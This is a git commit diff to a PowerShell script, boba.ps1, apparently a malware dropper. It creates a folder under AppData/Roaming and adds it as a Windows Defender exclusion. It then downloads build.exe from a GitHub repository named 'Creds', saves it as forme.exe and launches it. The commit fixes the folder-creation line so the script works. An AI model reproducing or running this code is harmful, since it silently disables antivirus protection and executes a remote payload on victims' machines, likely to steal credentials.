c275ead5e882a481e040162af7113e094a0a0e59
LoOwOdI <109526378+IgorAlaf@users.noreply.github.com>
2024-09-07 20:17:45 +1000

    Update boba.ps1

--- boba.ps1
+++ boba.ps1
@@ -1,4 +1,4 @@
-$env:USERPROFILE/AppData/Roaming -ItemType 'directory' -Name 'tempFolder';
+ New-Item -Path "$env:USERPROFILE/AppData/Roaming" -ItemType "directory" -Name "tempFolder"
 Add-MpPreference -ExclusionPath '$env:USERPROFILE/AppData/Roaming/tempFolder';
 Invoke-WebRequest 'https://github.com/IgorAlaf/Creds/raw/main/build.exe' -Outfile '$env:USERPROFILE/AppData/Roaming/tempFolder/forme.exe';
 Start-Process $env:USERPROFILE/AppData/Roaming/tempFolder/forme.exe
